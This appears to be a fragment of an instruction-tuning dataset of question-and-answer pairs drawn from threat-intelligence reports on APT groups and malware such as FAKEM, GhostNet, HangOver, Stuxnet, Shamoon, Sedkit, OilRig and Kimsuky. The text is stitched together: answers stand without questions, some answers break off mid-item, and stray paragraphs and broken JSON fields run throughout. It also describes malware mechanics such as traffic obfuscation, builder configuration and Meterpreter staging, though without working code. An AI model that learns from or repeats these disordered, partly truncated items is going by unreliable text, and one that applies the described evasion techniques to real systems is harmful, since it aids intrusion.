Messenger and HTML variants\nFIGURE 8: FAKEM domains associated with the Yahoo! Messenger variant\nMeanwhile, the Yahoo! Messenger samples we analyzed all accessed freeavg. sytes.net\u2014a domain name that frequently resolved to different IP addresses.\nThe various samples we collected appear to belong to groups that overlapped a little. This suggests that rather than being associated with a particular campaign, the use of various FAKEM RATs could be distributed among multiple threat actors.\nBig Headline: Conclusion\nKnowledge of the attack tools, techniques, and infrastructure of adversaries is critical for developing defensive strategies. This research paper examined three variants of a RAT\u2014FAKEM\u2014that attempt to disguise the network traffic they produce to stay under the radar.\nNow that popular RATs like Gh0st and PoisonIvy have become well-known and can easily be detected, attackers are looking for methods to blend in with legitimate traffic. While it is possible to distinguish the network traffic FAKEM RAT variants produce for the legitimate protocols they aim to spoof, doing so in the context of a large network may not be not easy. The RAT's ability to mask the traffic it produces may be enough to provide attackers enough cover to survive longer in a compromised environment.\nFortunately, solutions like Trend Micro\u2122 Deep Discovery can help network administrators protect their organizations from attacks that use the FAKEM RAT by detecting the traffic its variants produce.\nMedium Headline: TREND MICRO INCORPORATED\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers.

    "output": "The FAKEM RAT uses a specific encryption method for its network communication, which involves XOR-ing each byte with every letter in the string 'YHCRA' and then rotating the byte 3 bits to the right after every XOR operation. This encryption is applied at the bit level and ensures that the suspicious data passed between the compromised host and the attackers cannot be easily viewed in plain text.

    "instruction": "Big Headline: Introduction\nComputer network exploitation represents the leading edge of signals intelligence in the information age. The proliferation of computer systems throughout governments, businesses, and civic organizations represents a boon for would-be cyber spies.\nAwareness of cyber vulnerabilities, and even basic information security practices, is in its infancy, and largely absent in most organizations outside of the classified realm. Commercial computer systems, which represent most of the world's installed base, are insecure. This lack of security consciousness is reflective of the infancy of the information age. The Internet was never designed for security and, for the most part, there has been little incentive for software manufacturers to make security a first priority in the design and development of products, many of which are destined for consumer and/or small business use.\nThese challenges are present in advanced industrial societies, but are amplified many times over in developing countries. Ownership of computers is a relative rarity among many government departments. Where they exist, they often use grey market or pirated software. Resources are lacking to employ properly trained computer professionals, and many staff are barely computer literate. In this context, information security is often a distant priority.\nAnd yet, computers in the hands of individuals or at government offices, ministries, embassies, and civic and non-governmental organizations contain information that can be valuable. Files and e-mails with contact information, lists of meetings and attendees, draft position papers, internal PowerPoint presentations, organizational budgets, and lists of visitors can represent items of strategic value to rivals and enemies. Organizations, like individuals, can be subject to identity theft, leading to potentially serious breaches of security.\nRead the text above and answer this question: How does the GhostNet APT exploit the lack of security consciousness in both advanced industrial societies and developing countries? Why is this particularly problematic in developing countries?",
    "output": "GhostNet exploits the lack of security consciousness by targeting the widespread use of insecure commercial computer systems, which dominate the global installed base. This issue is exacerbated in advanced industrial societies due to the Internet's inherent lack of security and the low priority given to security by software manufacturers. In developing countries, the problem is amplified because computer ownership is rare among government departments, and where computers exist, they often use grey market or pirated software. Additionally, these countries lack resources to employ trained computer professionals, and many staff are barely computer literate. Consequently, information security becomes a distant priority, making it easier for GhostNet to exploit these vulnerabilities and access valuable information.",

    "instruction": "Big Headline: Industrial espionage\nWhile the Telenor case was most likely industrial espionage, we were initially unaware of other \"non-strategic/political\" targets by this attack group, but during our research we discovered several related attack files that were clearly targeting businesses. As can be seen in the example below, the social engineering aspects are more related to business content. We want to emphasize that except in the case of BUMI PLC, we have no information to suggest that any of the organizations named in the following pages have been compromised. However, the available information strongly indicates that they were targets of interests for the attackers.\nMedium Headline: Known target: Bumi PLC, Indonesia\nWhen searching for known instances of domains belonging to the attack infrastructure, we found a published incident report made by Context Information Security (2). This report details how the Chairman of Bumi PLC, Mr Samin Tan, had been exposed to a spear-phishing attack in July 2012. Bumi is an international mining group listed on the London Stock Exchange.\nSource: Context Information Security.\nBoth the domains mentioned in this report have been connected to the attack group investigated. For example, the malware executable \"dua2alhycox12.exe\" (c94267ba9c92f241379cdceed58777dc) connects to hycoxcable.com, which anoniemvolmacht.com historically acted as name server for. The latter domain has also shared IP with the malicious domain chronicleserv.org.\nBig Headline: Possible target: Restaurant industry\nIt appears unlikely that the restaurant and food industry should be the victim of targeted attacks. However, that's how it appears. One indicator is the decoy file below, taken from the malicious executable \"Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe\" (f52154ae1366ae889d0783730040ea85).\nGuardian article about a horsemeat scandal in Ireland. Target is unknown, but file was first submitted to the VirusTotal scan service from Great Britain.\nAnother indicator is the use of certain domain names, like the malicious bluebird-restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk. The latter is a restaurant in Chelsea, UK.\nBig Headline: Likely target: Chicago Mercantile Exchange\nWhile investigating the malicious domain web-mail-services.info, we found a number of other domains that had shared the IP address 188.95.48.99 with it.  One of these domains was cmegroups.net, a spoof of cmegroup.com; the domain belonging to Chicago Mercantile Exchange. CME is the world's largest futures exchange company (3).\nAn entry on WIPO (4), the UN arbitration body for domain name disputes, shows that a complaint regarding this domain name was leveled by CME against PrivacyProtect.org in 2012. The complaint was not disputed, and domain transferred to CME. However, the most interesting information is found in the case details.\nSource:wipo.net\nAn interesting question is of course whether there were any attachments to this mail.\nOther suggestive domain names that have been used include:\nserver721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de:\nThe latter is the mail server for several German businesses, for example restaurants. www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com:\nThe latter is a Lebanese newspaper in Arabic.\naccount.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de:\nThe latter is a German producer of pumps for high-viscosity fluids.\ndeltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com: Delta Airlines.\nmail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs mail.telenor.no: Telenor\nlynberrg.com vs lynberg.com: The latter belongs to Lynberg & Watkins, a US-based law firm. mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs mail.carmel.us:  The latter is the webmail address of Carmel&Carmel, a US-based law firm. armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com: The latter is a US-based manufacturer of composite materials for armor:\nWe do not know (yet) what purpose all these domains have, but it's hard to imagine that the name spoofing is done by anything but malicious intent; it is a common tactic in targeted attacks.\nMedium Headline: Project and debug paths\nCuriously, many of the executables we uncovered from related cases contained cleartext project and debug path strings (see Appendix D for full list). It is not very common to find malware with debug paths, but these particular threat actors did not seem to mind leaving such telltale signs, or maybe they were unaware of their presence. These paths gave more indicators that the attackers were Indian. First, many of the Visual Basic keyloggers contained the name \"Yash\", which might be an abbreviation for several Indian names. The trojans used against Telenor did not contain any such person name, but the Visual Basic project name is clearly related to others:\nTelenor case (02d6519b0330a34b72290845e7ed16ab, bfd2529e09932ac6ca18c3aaff55bd79) \"C:\\miNaPro.vbp\"\nRelated cases (4ad80ff251e92004f56bb1b531175a49, 3d6a8b2df08443c2aa4b6a07a9b55b16) \"D:\\YASH\\PRO\\MY\\DELIVERED\\2012\\DOWNLOADERS\\compiled\\NewSmack(sep2012)\\miNaPro.vbp\"\nThis similarity is not coincidental; these trojans are based on the same code and exhibit similar behaviour.\nThis and other text strings we initially saw gave further hints towards Indian attackers.\nR:\\payloads\\ita nagar\\Uploader\\HangOver 1.5.7 (Startup)\\HangOver 1.5.7 (Startup)\\Release\\Http_t.pdb C:\\Users\\neeru rana\\Desktop\\Klogger- 30 may\\Klogger- 30 may\\Release\\Klogger.pdb C:\\Users\\Yash\\Desktop\\New folder\\HangOver 1.5.7 (Startup) uploader\\Release\\Http_t.pdb\nBig Headline: A managed environment\nThe project paths also give a rare glimpse into something we almost never see \u2013 a managed malware creation environment, where multiple developers are tasked with specific malware deliverances.\nThis is visible in the way the projects themselves are organized:\n...Desktop\\Feb 2012\\kmail(httpform1.1) ...\n...May Payload\\new keylogger\\Flashdance1.0.2\\...\n...\\Monthly Task\\August 2011\\USB Prop\\...\n...\\Sept 2012\\Keylogger\\Release\\...\n...\\June mac paylods\\final Klogger-1 june-Fud from eset5.0\\Klogger- 30 may\\...\n...ner\\Task\\HangOver 1.2.2\\Release...\n...\\august\\13 aug\\HangOver 1.5.7 (Startup) uploader\\...\n...\\task information\\task of september\\Tourist 2.4.3...\n...\\final project backup\\complete task of ad downloader & usb grabber&uploader\\...\n..D:\\YASH\\PRO\\MY\\DELIVERED\\2012\\DOWNLOADERS\\compiled\\..\nThere are many diverging project paths which points towards different persons working on separate subprojects, but apparently not using a centralized source control system. The projects seem to be delegated into tasks, of which some seem to follow a monthly cycle. There are hints at team structures, like the string \"VB Team Matrix Production\" found in a sample (fa6d2483f766f8431b6c0a8c78178d48), an indication that a separate team works with Visual Basic development. Some series of malware contain strings like \"delivered\", which, together with the loose project structures may indicate that development work is being outsourced.\nBig Headline: The word \"Appin\".\nIn a great number of isolated cases and contexts, the word \"Appin\" shows up and there seems to be some connection with the Indian security company called Appin Security Group. By this, we are not implicating or suggesting inappropriate activity by Appin. Maybe someone has tried to hurt Appin by falsifying evidence to implicate them. Maybe some rogue agent within Appin Security Group is involved, or maybe there are other explanations. Getting to the bottom of that is beyond our visibility.\nFor example, the strings \"Appin\", \"AppinSecurityGroup\", and \"Matrix\" are frequently found inside executables.\nOne example of this peculiarity is debug paths inside malware files:\nC:\\BNaga\\backup_28_09_2010\\threads tut\\pen-backup\\BB_FUD_23\\Copy of client\\ Copy of client\\appinbot_1.2_120308\\Build\\Win32\\Release\\appinclient.pdb\nC:\\BNaga\\kaam\\Appin SOFWARES\\RON 2.0.0\\Release\\Ron.pdb\nC:\\BNaga\\SCode\\BOT\\MATRIX_1.2.2.0\\appinbot_1.2_120308\\Build\\Win32\\Release\\deleter.pdb\nC:\\Documents and Settings\\Administrator\\Desktop\\Backup\\17_8_2011\\MATRIX_1.3.4\\CLIENT\\ Build\\Win32\\Release\\appinclient.pdb\nD:\\Projects\\Elance\\AppInSecurityGroup\\FtpBackup\\Release\\Backup.pdb\nOne should note that anyone can add or change such text strings.\n\nWhat indicators in the malware executables suggested that the attackers were Indian? How did these indicators provide insights into the attackers' nationality?",
    "output": "A: The indicators that suggested the attackers were Indian included the presence of the name 'Yash' in many of the Visual Basic keyloggers, which is a common abbreviation for several Indian names.

In a typical scenario, a skilled developer creates a builder and shares it with an operator more skilled in intrusion operations than in code development. This separation of tasks is more efficient and supports a faster tempo of offensive operations. A typical builder provides a graphical user interface that enables a threat actor to configure elements such as the location of the CnC server.\nTo recap, these shared characteristics, as discussed in previous sections, include the following:\n\u2022 The Sunshop and DTL PE resources\n\u2022 Common import tables\n\u2022 Six different digital certificates\n\u2022 Common compile times\n\u2022 Common malware families\nWe identified a builder tool used to create Trojan.APT.9002 binaries, which we are dubbing \"9002 Builder.\" This builder generates Trojan.APT.9002 binaries with the DTL resource.\nAs shown in Figure 10, the dialogue and menu options in this GUI are in Chinese. The builder enables threat actors to configure the following:\n\u2022 Both a primary and a secondary CnC server.\n\u2022 A specific ID. The default ID produced by this builder is \"1.\"\n\u2022 An \"Internet health check\" domain. The default health check domain configured in this builder was \"update.microsoft.com\". An Internet health check domain is typically used by malware to determine whether a target's endpoint is connected to the Internet before acting.\n\u2022 Proxy settings, including address/port, type, proxy authentication details, auto-detect proxy, and force-proxy only.\nAlso, the text in the title bar of this builder is \"[User_Server_Builder] update 2012-7-21\". Although the servers produced by this builder have a compile time of 10/23/12 8:30 UTC, we believe the date in the title bar of the builder is significant; we identified five different binaries with a compile time of 7/21/12.\nAll five utilized the same DTL resource found in 9002 Builder.\nThe 9002 Builder appears to be a modified variant of the builder used to create the samples listed in Table 12. The compile time of the builder is 10/23/2012 11:18 UTC, a little less than 3 hours after the compile time of the server that is produced by it. We believe it is a common practice for the developer to compile a new server, update the builder code accordingly, then compile the new builder. The older date in the title bar may just be an oversight as i t would have to be manually updated by the developer.\nThe builder contains a copy of the server executable in its PE resource section, under BIN. The server executable is responsible for installing the 9002 payload malware, and has its configuration block stored in its .data section, with some default settings including the CnC pointing to 192.168.8.105. The configuration block uses simple, single-byte XOR encryption. The key varies from version to version; in some cases, it skips null bytes. During the installation routine, the configuration block is written to the registry value sysinfo under the registry key HKCU\\Software\\Classes.\nWhen the threat actor builds a malware executable, the builder writes the server executable to disk and overwrites the configuration block with the newly configured options. The location of the configuration block within the .data section is hard-coded, meaning that the builder must be modified each time the server code is updated and the location of the configuration block changes. We noticed that the configuration block is indeed stored at a different offset in the samples compiled on 7/21/12 as compared to the sample created by the builder we have with the compile date of 10/23/12. This further supports our belief in the practice of the developer compiling the server and then shortly after compiling the builder. He would need time to locate the new offset of the configuration block in the newly compiled server executable\nand then change the hard-coded value in the builder code.\nAttackers using 9002 Builder seem to have gradually adopted another launcher that stores the configuration block as a resource instead of storing it in its .data section. Based on the compile-time analysis outlined in the \"Compile Times\" section of this report, the shift began in late October of 2012 (with a few exceptions). This shift makes sense for the builder's developer(s); they no longer needed to update the builder for every code change in the launcher or 9002 payload malware. This launcher, mentioned earlier in this paper as having the import table hash 3a7faeac22e6ab5c3c28a2b617901b51, supports different payloads, such as Poison Ivy and 9002.\nBig Headline: Conclusion\nBased on the evidence provided, we draw the following possible conclusions:\n[High Confidence] SDQ exists and supports separate APT campaigns. We believe the most likely explanation for these documented correlations is that a shared 'development and logistics' operation (SDQ) supports a number of different APT campaigns, as part of formal offensive apparatus.\n[Low Confidence] SDQ and APT campaigns are a single actor. That said, it is conceivable that the 11 clusters of activity, previously believed to be independent campaigns run by different actors, are in fact one cluster of activity run by one well-resourced actor. However, we believe this scenario is less likely because each cluster of activity utilized malware samples with different artifacts such as passwords, campaign identifiers, and mutexes. These artifacts were generally consistent within each cluster of activity but differed across clusters.\nMedium Headline: [Medium Confidence] SDQ does not exist, and APT actors informally share among each other.\nAlternatively, different actors might be responsible for the documented 11 clusters of activity and instead of relying on a centralized development and logistics operation, these actors share TTPs through formal or informal channels.\nIn each of these scenarios, a shared development and logistics infrastructure or some notion of a digital quartermaster clearly underpins all of the activity presented in this report. Whether this quartermaster involves informal connections between developers or a structured bureaucratic organization serving a central offensive apparatus is unclear. Regardless of the scenario, the overall finding of a shared development and logistics infrastructure suggests targeted organizations are facing a more organized menace than they realize.\n\nQuestion: What evidence supports the existence of a shared development and logistics infrastructure (SDQ), and how does this affect the understanding of APT campaigns?\n\nAnswer:",
    "output": "The evidence supporting the existence of a shared development and logistics infrastructure (SDQ) includes the use of common PE resources (Sunshop and DTL), common import tables, six different digital certificates, common compile times, and common malware families across multiple APT campaigns. This shared infrastructure suggests that a centralized operation supports various APT campaigns, making the threat landscape more organized and sophisticated. The overall finding indicates that targeted organizations are facing a more coordinated menace than initially realized.",

    "instruction": "Small Headline: Stuxnet\nThe Stuxnet incident and its relatives Duqu, Flamer and Gauss are some of the most talked-about cases of targeted attacks. As far as we know today, the Stuxnet operation began in November 2005 with the registration of the command and control (C&C) servers used in the attacks. The first recorded appearance of what we now call Stuxnet version 0.5 was in November 2007. Since then, a handful of different versions have been found and analyzed. Stuxnet 1.x is based on what is now known as the \"tilded\" platform; whereas Stuxnet 0.5 is based on the Flamer framework. The code segments and programming style differ, which indicates that two different programming teams were most likely responsible for the different branches of Stuxnet. Thorough investigation into the mechanism and functions of this threat started in July 2010. Stuxnet is the first known autonomous threat to target and sabotage industrial control systems to such an extent.\nStuxnet is a sophisticated piece of malware, which uses seven vulnerabilities to spread and infect its targets. The most notable vulnerability is the  (CVE-2010-2568), which allows it to auto-execute on USB drives. Spreading through infected portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the Internet. This was most likely the first infection vector used by Stuxnet. In addition, it is able to infect Step7 project files, which are used to control Programmable Logic Controllers (PLCs). This allowed the worm to infect computers whenever the engineer exchanged the project files. Besides this, it also spread through network shares, a printer spooler vulnerability, an old Windows RPC (remote procedure calls) vulnerability and a known password in the WinCC database. In the end, Stuxnet propagated further than its authors probably intended. We have monitored more than 40,000 infected IP addresses in 155 countries. Many of those systems are most likely just collateral damage and were not intended to be infected by the attackers. For example multiple computers at Chevron were infected by Stuxnet, without any damage being done.\nPart of the malware code was signed with stolen digital certificates making it harder to detect by security tools. To hide its activity even further, Stuxnet executed slightly different infection routines depending on the security software installed on the target. On the USB drive itself, the malware would hide its own files and even delete itself from it after three successful propagations. Tricks like these, to make the detection of the malware more difficult, are now frequently used in modern targeted attacks.\nStuxnet's payload focused on PLCs, which are used to control different industrial components. The target of the Stuxnet operation is believed to be a uranium enrichment facility in Iran. The sabotage payload disrupted and partially destroyed the cascaded high frequency gas centrifuges. The early version of Stuxnet targeted the S7-417 PLCs and modified its valve settings. Closing the valves at certain points in time would lead to an increase of pressure that could damage the equipment. The later version of the threat focused on the S7-315 PLCs, manipulating the spinning frequency of the rotating motors. By speeding the centrifuges up and slowing them down repeatedly, the output quality could be spoiled and the centrifuges themselves could be damaged. The payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup. This minimized the collateral damage at other facilities and showed that the attackers had in-depth knowledge of the targeted uranium enrichment facilities. To avoid detection by personnel monitoring the human machine interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played those back in a loop.\nSmall Headline: Night Dragon\nOperation Night Dragon, which was uncovered in 2010, is a typical example of global oil companies being targeted, but this time not with the aim of disruption in mind. The attacks started in late 2009 and were directed at finding project details and financial information about oil and gas field exploration and bids.\nThe attackers started by compromising public facing Web servers through SQL injection and installing Web shells on them. Once they had control over the server they used common hacking tools to harvest local\npasswords, dump password hashes, sniff authentication messages and exploit internal active directory configuration. This allowed them to move on to other internal computers using the gathered passwords. In addition, spear phishing messages were used to compromise additional computers. The attackers did not use any zero-day vulnerabilities during their attacks. Rather they used publicly available tools for each individual job.\nOn compromised computers a common  was installed that communicated back to the C&C server, allowing remote access to the computer. This allowed the attacker to find and extract valuable information.\nSmall Headline: Shamoon/Disttrack\nIn August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil producers of the world in Saudi Arabia. The  malware used in this attack, also known as Shamoon, consists of three components: a dropper, a wiper and a reporter module.\nThe dropper component is responsible for creating all the required files on the system, registering a service called \"TrkSvr\" in order to start itself with Windows. It also attempts to copy itself to accessible network shares and execute itself remotely if successfully copied.\nThe wiper component is only activated when a hardcoded configuration date has been passed. This enables a coordinated, \"time bomb\" scenario. The module then drops a legitimate and digitally signed device driver that provides low level disk access from user space. The malware collects file names and starts overwriting them with a JPEG image or 192KB blocks of random data. At the end Disttrack finishes the computer off by wiping the master boot record with the same data.\nThe reporter component is responsible for sending back a HTTP GET request to the C&C server. It reports the domain name, IP address and number of files overwritten.\nBy acquiring user credentials and gaining access to the domain controller the attackers were able to push the malware on to many systems before they triggered the destructive payload. Disttrack's secondary goal may have been to steal valuable information from infected computers, but the main intent was to render the computers unusable by wiping the operating system and master boot record, causing disruption and downtime at the targeted company. Although wiping is also frequently used to destroy evidence of the attack and make forensics more difficult. The malware does not contain any payload against ICS, like Stuxnet does for PLCs, and is not as sophisticated. According to the company, no computer related with the production or distribution of oil was affected, since the operational network is separated and specially protected.\nOne group that claimed responsibility for the attack posted on Pastebin that it was an anti-oppression hacker group. The attack was prompted by disappointment with some of the regimes in the Middle East, the group said. True or not, this shows that it is not necessarily only state-sponsored attackers who are carrying out disruptive attacks. Sabotage attacks usually fall into the orbit of hacktivists, who seek attention rather than profit. Some sources reported that the attackers had help from insiders, which would explain the so far unclear infection vector.\nSoon after this attack became known, a Qatari gas company was attacked in a similar way.\nMedium Headline: Spear phishing attacks in the energy sector\nSpear phishing is, along with watering hole attacks, one of the most common attack vectors used to attack companies. The attacks are simple to carry out. They often follow the same pattern, starting with a reconnaissance phase to gather all publicly available information. This is followed by the incursion phase of breaking in and compromising computers. After that comes the discovery phase, where the attacker gathers passwords and maps the internal network. The final stage is capture and exfiltration, where the valuable information is copied and sent back to the attacker. The last phase may also involve a disruption attack if the goal is sabotage. For a more detailed analysis of the attack phases, see Appendix C.\nA spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website. Such emails are sent in bulk to a handful of key users. These waves are often repeated till enough people fall for the bait and compromise their computers. For analysis on the social engineering themes used, attack details and attachment types used, see Appendix A.\n\nQ: What were the primary goals and methods used by the attackers in Operation Night Dragon, and how did they gain access to internal networks?",

    "instruction": "Small Headline: Fingerprinting\nOnce the target clicks on the phishing URL, the browser is redirected to the Sedkit landing page. The purpose of this page is to build a report of the visitor's machine. To do so, it contains over 200 lines of JavaScript code (once beautified) that collect various data.\nThe landing page code has stayed the same since March 2015, and an annotated, beautified extract is shown below. The JavaScript comments are from the developers, while the variable string_of_json is the actual report built as a JSON object.\n\u278a Collect the visitor's time zone\n\u278b Collect information on the visitor's browser by enumerating the properties of the JavaScript's navigator object (<>)[33]\n\u278c Collect information on the visitor's screen, by enumerating the properties of the JavaScript's screen object (<>)[34]\n\u278d Collect the list of installed browser plugins, with specific methods in the case of Internet Explorer 11, and with generic methods otherwise\nAn example of a Sedkit report produced by the landing page is shown in Figure 11.\nThe report is then sent within an HTTP POST request to a URI hardcoded in the landing page code. An example of such a URI is shown below:\nThis hardcoded URI path is different each time the landing page is visited, and only works for a limited amount of time. This probably serves to prevent security researchers from sending specially crafted reports directly to Sedkit servers, in order to collect the exploits. The only way (we know of) to visit the exploit kit is to pass through a landing page URL first, which can be difficult due to the limited distribution of the phishing emails containing those URLs. Again, these landing page URLs are active for a short time.\nThen, depending on the report, the visitor may receive a suitable exploit, or be redirected to the legitimate website the email lure was based on, as shown in . Given the amount of information contained in the report, the operators can very precisely select the visitors to exploit, and those to filter out. The exact logic behind this selection is unknown to us, and remains one of the major open questions regarding Sedkit.\nSmall Headline: Delivering Exploits\nLanding page visitors matching the Sedkit operators' criteria then receive an exploit suitable for their machines. Since Sedkit's first appearance, numerous exploits have been added. Table 3 lists the exploited vulnerabilities we have observed during our tracking of Sedkit.\nThe end goal of these exploits is to download and execute Sednit malware, usually .\nMost of these exploits and their use by Sednit have already been documented, as mentioned in the\"Reference\" column of Table 3. Nevertheless, we will describe the specific case of the CVE-2014-6332 vulnerability exploitation, as it is a good example of Sednit's abilities, and to the best of our knowledge has not been documented previously.\nThe vulnerability CVE-2014-6332 was discovered in May 2014 by an IBM X-Force security researcher (<>)[51], and affected Internet Explorer versions 3 through 11. Roughly summarized, the vulnerability is an integer overflow in the Internet Explorer VBScript engine that allowed arbitrary read/write in memory.\nSoon after the disclosure, a proof-of-concept was released by a Chinese security researcher (<>)[52]. The proof-of-concept used the vulnerability to disable Internet Explorer's\"SafeMode\", so that arbitrary VBScript code could be executed. Numerous miscreants then integrated revamped versions of this proof-of-concept into their toolsets, and the Sednit group was no exception. Indeed, in October 2015 a simple revamped version of the original proof-of-concept was added to Sedkit.\nBut the Sednit group went one step further in February 2016 by deploying a different exploit for this vulnerability. This time the purpose of the exploit was not to disable\"SafeMode\", but rather to write a Return-Oriented Programming (ROP) shellcode in memory, and to execute it. To do so, the exploit developers implemented numerous helper functions in VBScript, resulting in over 400 lines of code. For example, the beautified code in charge of building the ROP shellcode is shown below:\nWe did not find any re-use of this code by other groups of attackers, leading us to believe it was specifically developed by, or for, the Sednit group.\nParts of this code seem to have been inspired by a presentation at BlackHat USA 2014, where a security researcher named Yang Yu published some JavaScript code related to Internet Explorer exploitation (<>)[53]. As an example of that, Figure 12 shows one particular JavaScript function published on one of his slides.\nAnd a very similar VBScript function in the Sedkit exploit code is shown below:\nIn other words, the exploit developers re-implemented some of the ideas of the BlackHat presentation in VBScript, and implemented the ROP part themselves.\nWe believe this is a good example of the technical abilities available to the Sednit group. The developers were able to understand a complex exploit well enough to make their own version. We can speculate that the purpose of that was to bypass some security products. It also shows that these developers are following technical security publications.\nMedium Headline: Conclusion and Open Questions\nFrom personalized phishing emails to exploit kits, the Sednit group invested a lot of effort into its attack methods over the last two years. In particular, the number of 0-day exploits available to the group is surprisingly high, showing a significant resources at their disposal.\nOne major open question regarding the Sednit attack methods concerns the crawling of the Sedkit exploit kit. Indeed, the exact logic of the operators in accepting a visitor as a target remains unknown to us, and probably depends on their objectives at that moment. Given the fact that the exploit kit has been the home of several 0-day exploits in the past, the ability to receive an exploit from it would surely be interesting from a research perspective.\n\nAnswer this question based on the above context: What is the significance of the Sednit group's exploitation of the CVE-2014-6332 vulnerability, and how did they enhance their exploit over time?",
    "output": "The Sednit group's exploitation of the CVE-2014-6332 vulnerability is significant because it demonstrates their technical abilities and resourcefulness. Initially, in October 2015, the group used a simple revamped version of the original proof-of-concept to disable Internet Explorer's 'SafeMode'. However, in February 2016, they deployed a more sophisticated exploit that wrote a Return-Oriented Programming (ROP) shellcode in memory and executed it. This enhanced exploit included numerous helper functions in VBScript, totaling over 400 lines of code. The developers likely created this advanced version to bypass security products, showcasing their understanding of complex exploits and their ability to adapt technical security publications for their own purposes.",

Belal's folders also contained a .TXT file named Israil mails.txt, which had 2,572 email addresses, possibly for attack purposes.\nMostafa's Facebook profile\nBelal logged in to the Advtravel control panel\nBig Headline: CONCLUSION\nThe malware campaigns\u2014Operation Arid Viper and Advtravel\u2014discussed in detail in this paper are separate but closely linked. Operation Arid Viper targets specific Israeli organizations, including some high-profile victims, using a network infrastructure in Germany with several strong ties to Gaza in Palestine.\nAdvtravel, meanwhile, has more connections\u2014 possible culprits and victims alike\u2014to Egypt. However, based on IP address logins, we again saw connections to the Gaza Strip.\nWhile the two campaigns shared infrastructure, their tactics could not be further apart. Operation Arid Viper is a sophisticated campaign targeting key individuals in organizations in order to exfiltrate sensitive data. Its C&C servers were, in fact, closely locked down, providing very little hint that could aid our investigation.\nAdvtravel, on the other hand, looks very much like the work of less-skilled cybercriminals who appeared to be motivated neither by financial gain nor conducting espionage. Instead, they look like a classic group of beginner hackers just starting their careers.\nYet it remains intriguing to note the close ties between Operations Arid Viper and Advtravel, apart from signs of Arabic heritage. We cannot know for sure if the people behind the campaigns operate as separate groups or as individuals though we suspect they are part of a larger organization. Several organizations with ties to both Gaza and Egypt, for instance, the Muslim Brotherhood\u2014a transnational Islamist organization founded in Egypt in 1928, exist. The brotherhood was legalized in Egypt in 2011 and won the parliamentary elections before the army overthrew it in 2013. In 1987, brotherhood-affiliated charities\nestablished the Islamic Resistance Movement, better known as \"Hamas,\" an infamous Palestinian organization that has been controlling the Gaza Strip since around 2007.\nWhoever the real culprits are, it is clear that they are part of the Arab world, evidence of a budding generation of Arab hackers and malware creators intent on taking down their chosen adversaries. Some of the black hats\u2014be they mercenaries or cybersoldiers\u2014are actively targeting countries such as Israel due to political motivations. We have seen all of the ingredients of a cyberskirmish guerrilla war that goes unnoticed by mainstream IT security media.\nBeyond these specific campaigns, what we found most interesting was that we had disparate groups of Arab aggressors who used the same infrastructure to launch and monitor attacks. This can possibly mean two things\u2014the attacks were somehow linked, something that appears unlikely given their nature and motivation, or a supra-organization that provides means for Arab parties to commit acts of cyberviolence exists, which appears to be the more probable option.\nIf our theory holds, we will see a host of cyber attacks with detrimental results stem from Arab countries in the near future. Internet users will be stuck in the middle of a battlefield they do not care much for.\nWe can only offer well-informed inferences on attribution for now. Nevertheless, one thing is very clear\u2014whether the malware involved was sophisticated and stealthy or basic and created by beginners, they both had devastating effects on their victims. Trend Micro will always continue to uncover such threats in order to make the world safe for the exchange of digital information.\nBig Headline: REFERENCES\n[1] The Week Ltd. (1 August 2014).

This suggests that APT41 may use phishing as a tactic to gain access to victim systems, particularly in the context of supply chain compromises. Furthermore, the #Phishing Description# mentions that adversaries may send phishing messages to gain access to victim systems, and that phishing can be targeted, known as spearphishing.

Specifically, meek encodes TOR traffic into HTTP, wraps it in a legitimate TLS connection to a server hosted in the same CDN cloud as the reflection server, and uses the TLS service and cipher suites used by Firefox to further obfuscate traffic. This multi-stage process creates an outbound network connection that appears to contain normal HTTPS POST requests, making it extremely difficult to differentiate from legitimate connections. By using data obfuscation in this way, APT29 can effectively hide its command and control traffic, making it more challenging for network analysts to detect. This is a clear example of how data obfuscation can be used to evade detection, as described in the data obfuscation description.",

    "output": "The Kimsuky group primarily uses the stager method for Meterpreter deployment. Instead of including Meterpreter directly in the distributed file, they include a shellcode that downloads a backdoor containing Meterpreter. Specifically, the downloaded file is metsrv.dll, the basic backdoor of Meterpreter, which is executed using the Reflective DLL injection method. This method allows the start address (beginning with MZ) to operate as code, loading the DLL file into memory and then handing over control to run the actual code of metsrv.dll. The Staged method involves distributing a small stager that downloads the main malware from the C&C server, while the Stageless method includes the main malware directly in the binary, allowing direct communication with the C&C server without needing to download additional components.",

    "instruction": "Big Headline: Overview\nIn February 2022, we detected a new OilRig downloader, which we named ODAgent based on its filename: ODAgent.exe. ODAgent is a C#/.NET downloader that, similar to OilRig's , uses the Microsoft OneDrive API for C&C communications. Unlike Marlin, which supports a comprehensive list of backdoor commands, ODAgent's narrow capabilities are limited to downloading and executing payloads, and to exfiltrating staged files.\nODAgent was detected in the network of a manufacturing company in Israel \u2013 interestingly, the same organization was previously affected by OilRig's , and later by another new downloader, OilCheck, between April and June 2022. SC5k and OilCheck have similar capabilities to ODAgent, but use cloud-based email services for their C&C communications.\nThroughout 2022, we observed the same pattern being repeated on multiple occasions, with new downloaders being deployed in the networks of previous OilRig targets: for example, between June and August 2022, we detected the OilBooster, SC5k v1, and SC5k v2 downloaders and the , all in the network of a local governmental organization in Israel. Later we detected yet another SC5k version (v3), in the network of an Israeli healthcare organization, also a previous OilRig victim.\nSC5k is a C#/.NET application whose purpose is to download and execute additional OilRig tools using the Office Exchange Web Services (EWS) API. The new versions introduced changes to make retrieval and analysis of the malicious payloads harder for analysts (SC5k v2), and new exfiltration functionality (SC5k v3).\nAll the downloaders, summarized in Figure 1, share a similar logic but have different implementations and show growing complexity over time, alternating C#/.NET binaries with C/C++ applications, varying 